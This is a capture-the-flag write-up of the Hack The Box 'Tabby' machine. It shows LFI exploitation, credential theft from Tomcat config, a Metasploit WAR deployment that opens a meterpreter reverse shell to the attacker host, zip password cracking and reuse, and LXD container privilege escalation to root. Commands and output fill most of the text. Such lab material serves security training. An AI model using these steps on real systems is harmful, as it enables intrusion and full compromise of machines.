---
"title": "Hack The Box - Tabby"
"date": 2020-11-08
"tags": ["linux", "easy", "lfi", "tomcat", "lxd", "fcrackzip"]
"keywords": ["linux", "easy", "lfi", "tomcat", "lxd", "fcrackzip"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "Tabby is an easy Linux machine, first we need to find the LFI and get some sensitive files of Tomcat and Upload war file to get shell and Privilege Escaltion"
"featured_image": "/img/htb-tabby/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-tabby/Untitled.png)

Tabby is an easy Linux machine, first we need to find the LFI and get some sensitive files of Tomcat and Upload war file to get shell and Privilege Escaltion

Link: [https://www.hackthebox.eu/home/machines/profile/259](https://www.hackthebox.eu/home/machines/profile/259)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP Enumeration

Started checking the webpage in port 80, and its seems static webpage. Also found mail address `sales@megahosting.htb`, and we got a valid domain from it.

![Untitled](/img/htb-tabby/Untitled%201.png)

The site is the same, but now the links work.

Started Checking all the links and tabs. And Found a parameter in `news.php`

![Untitled](/img/htb-tabby/Untitled%202.png)

I just tried a `LFI` and it works. Now time to get some interesting files.

![Untitled](/img/htb-tabby/Untitled%203.png)

I can't find anything useful with this LFI so I moved to another port `8080`

And Its Tomcat running.

![Untitled](/img/htb-tabby/Untitled%204.png)

I decided to use LFI to find Tomcat Files.

I started googling about Tomcat9 file list and found this

> [https://packages.debian.org/sid/all/tomcat9/filelist](https://packages.debian.org/sid/all/tomcat9/filelist)

The webpage seems empty, but checking the source code reveals an username and password.

![Untitled](/img/htb-tabby/Untitled%205.png)

First I tried in `/manager` didn't worked and then moved to `/host-manager` and it works with these credentials `tomcat : $3cureP4s5w0rd123!`.

![Untitled](/img/htb-tabby/Untitled%206.png)

I can't find any way to upload a file or something. So I started looking for exploits available for Tomcat Manager.

> [https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)

So there is a metasploit module for this.

```yaml
root@kali:~# searchsploit tomcat manager
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat 6.0.13 - Host Manager Servlet Cross-Site Scripting                                                                                                                 | multiple/remote/30495.html
Apache Tomcat Manager - Application Deployer (Authenticated) Code Execution (Metasploit)                                                                                         | multiple/remote/16317.rb
Apache Tomcat Manager - Application Upload (Authenticated) Code Execution (Metasploit)                                                                                           | multiple/remote/31433.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I used the Manager Deploy Module.

```bash
msf5 exploit(multi/http/tomcat_mgr_deploy) > options

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting      Required  Description
   ----          ---------------      --------  -----------
   HttpPassword  $3cureP4s5w0rd123!   no        The password for the specified username
   HttpUsername  tomcat               no        The username to authenticate as
   PATH          /host-manager  yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.10.194         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:[path](path)'
   RPORT         8080                 yes       The target port (TCP)
   SSL           false                no        Negotiate SSL/TLS for outgoing connections
   VHOST                              no        HTTP server virtual host

Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

```bash
msf5 exploit(multi/http/tomcat_mgr_deploy) > exploit

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Attempting to automatically select a target...
[-] Failed: Error requesting /host-manager/serverinfo
[-] Exploit aborted due to failure: no-target: Unable to automatically select a target
[*] Exploit completed, but no session was created.
```

It looking for `serverinfo` file which is missing.

I google about its location and found it.

![Untitled](/img/htb-tabby/Untitled%207.png)

Again error, And its telling me to select target

```bash
msf5 exploit(multi/http/tomcat_mgr_deploy) > set PATH /host-manager/text
PATH => /host-manager/text
msf5 exploit(multi/http/tomcat_mgr_deploy) > exploit

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Attempting to automatically select a target...
[-] Failed: Error requesting /host-manager/text/serverinfo
[-] Exploit aborted due to failure: no-target: Unable to automatically select a target
[*] Exploit completed, but no session was created.
```

I set the target to 1.

```bash
msf5 exploit(multi/http/tomcat_mgr_deploy) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   Java Universal
   2   Windows Universal
   3   Linux x86

msf5 exploit(multi/http/tomcat_mgr_deploy) > set target 1
target => 1
```

Now I get 403 error, I can't upload it.

```bash
msf5 exploit(multi/http/tomcat_mgr_deploy) > exploit

[*] Started reverse TCP handler on 10.10.14.7:4444 
[*] Using manually select target "Java Universal"
[*] Uploading 6275 bytes as zhpcU7dZuFQHdCHqffqv1N3Rb0w.war ...
[-] Exploit aborted due to failure: unknown: Upload failed on /host-manager/text/deploy?path=/zhpcU7dZuFQHdCHqffqv1N3Rb0w [403 ]
[*] Exploit completed, but no session was created.
```

Let's switched to `/manager`

All set now time to get shell. (Note : If you didn't get shell in first time, run that again)

```bash
msf5 exploit(multi/http/tomcat_mgr_deploy) > options

Module options (exploit/multi/http/tomcat_mgr_deploy):

   Name          Current Setting     Required  Description
   ----          ---------------     --------  -----------
   HttpPassword  $3cureP4s5w0rd123!  no        The password for the specified username
   HttpUsername  tomcat              no        The username to authenticate as
   PATH          /manager/text       yes       The URI path of the manager app (/deploy and /undeploy will be used)
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.10.194        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:[path](path)'
   RPORT         8080                yes       The target port (TCP)
   SSL           false               no        Negotiate SSL/TLS for outgoing connections
   VHOST                             no        HTTP server virtual host

Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.21      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   1   Java Universal
```

I got shell

```bash
msf5 exploit(multi/http/tomcat_mgr_deploy) > exploit

[*] Started reverse TCP handler on 10.10.14.21:4444 
[*] Using manually select target "Java Universal"
[*] Uploading 6275 bytes as 0msdxB5K7cAihXhlrKiT9J1oAWeOll.war ...
[*] Executing /0msdxB5K7cAihXhlrKiT9J1oAWeOll/dMpGF3e3YmV.jsp...
[*] Undeploying 0msdxB5K7cAihXhlrKiT9J1oAWeOll ...
[*] Sending stage (53904 bytes) to 10.10.10.194
[*] Meterpreter session 1 opened (10.10.14.21:4444 -> 10.10.10.194:50400) at 2020-06-22 12:30:12 +0530

meterpreter >
```

## Getting User shell

While enumerating, found there is a backup file in `/var/www/html/files`

```bash
tomcat@tabby:/var/www/html/files$ ls
ls
16162020_backup.zip  archive  revoked_certs  statement
```

Downloaded to machine and it askes for password to unzip, I used `fcrackzip` to find the password.

```bash
root@kali:~/CTF/HTB/Boxes/Tabby# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt 16162020_backup.zip 

PASSWORD FOUND!!!!: pw == admin@it
root@kali:~/CTF/HTB/Boxes/Tabby# unzip 16162020_backup.zip 
Archive:  16162020_backup.zip
   creating: var/www/html/assets/
[16162020_backup.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
```

And there is no interesting things from the files.

```bash
root@kali:~/CTF/HTB/Boxes/Tabby/var# ls -R
.:
www

./www:
html

./www/html:
assets  favicon.ico  files  index.php  logo.png  news.php  Readme.txt

./www/html/assets:

./www/html/files:
```

So I decided to use the same password for user `ash` and It worked with `ash : admin@it`

```bash
$ su ash
su ash
Password: admin@it

ash@tabby:/etc/tomcat9$ cd /home
cd /home
ash@tabby:/home$ ls
ls
ash
ash@tabby:/home$ cd ash
cd ash
ash@tabby:~$ ls
ls
tellico  user.txt
ash@tabby:~$ cat user.txt
```

## Privilege Escalation

Checking the `id` of user ash reveals that he is in the group of `lxd`

```yaml
ash@tabby:/var/www/html/files$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Reference:

- [https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/)
- [https://www.exploit-db.com/exploits/46978](https://www.exploit-db.com/exploits/46978)

Uploaded the compressed file to the box. Move to home directory and run these commands.

```bash
**ash@tabby:~$ wget http://10.10.14.21:8000/alpine-v3.12-x86_64-20200621_0308.tar.gz
<14.21:8000/alpine-v3.12-x86_64-20200621_0308.tar.gz
--2020-06-20 22:03:07--  http://10.10.14.21:8000/alpine-v3.12-x86_64-20200621_0308.tar.gz
Connecting to 10.10.14.21:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3211249 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.12-x86_64-20200621_0308.tar.gz’

alpine-v3.12-x86_64 100%[===================>]   3.06M   792KB/s    in 4.0s    

2020-06-20 22:03:11 (792 KB/s) - ‘alpine-v3.12-x86_64-20200621_0308.tar.gz’ saved [3211249/3211249]

ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200621_0308.tar.gz --alias myimage
<e-v3.12-x86_64-20200621_0308.tar.gz --alias myimage
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04

ash@tabby:~$ lxd init
lxd init
Would you like to use LXD clustering? (yes/no) [default=no]: 
Do you want to configure a new storage pool? (yes/no) [default=yes]: 
Name of the new storage pool [default=default]: Name of the storage backend to use (dir, lvm, ceph, btrfs) [default=btrfs]: 
Create a new BTRFS pool? (yes/no) [default=yes]: 
Would you like to use an existing block device? (yes/no) [default=no]: 
Size in GB of the new loop device (1GB minimum) [default=15GB]: 
Would you like to connect to a MAAS server? (yes/no) [default=no]: 
Would you like to create a new local network bridge? (yes/no) [default=yes]: 
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
Would you like LXD to be available over the network? (yes/no) [default=no]: 
Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 

ash@tabby:~$ lxc image import ./alpine-v3.12-x86_64-20200621_0308.tar.gz --alias myimage
<e-v3.12-x86_64-20200621_0308.tar.gz --alias myimage
Error: Image with same fingerprint already exists
ash@tabby:~$ lxc image list
lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
| myimage | 0b4c5dcfa7ba | no     | alpine v3.12 (20200621_03:08) | x86_64       | CONTAINER | 3.06MB | Jun 20, 2020 at 10:03pm (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
ash@tabby:~$ lxc init myimage wolf -c security.privileged=true  
lxc init myimage wolf -c security.privileged=true
Creating wolf
ash@tabby:~$ lxc config device add wolf mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to wolf
ash@tabby:~$ lxc start wolf
lxc start wolf
ash@tabby:~$ lxc exec wolf /bin/sh
 lxc exec wolf /bin/sh
~ # ^[[30;5R

~ # ^[[30;5Rid
id
uid=0(root) gid=0(root)
~ # ^[[30;5Rcd /mnt
cd /mnt
/mnt # ^[[30;8Rls
ls
root
/mnt # ^[[30;8Rcd root
cd root
/mnt/root # ^[[30;13Rls
ls
bin         home        lost+found  root        swap.img
boot        lib         media       run         sys
cdrom       lib32       mnt         sbin        tmp
dev         lib64       opt         snap        usr
etc         libx32      proc        srv         var
/mnt/root # ^[[30;13Rcd root
cd root
/mnt/root/root # ^[[30;18Rls
ls
root.txt  snap
/mnt/root/root # ^[[30;18Rwhoami
whoami
root**
```

We Own the box!!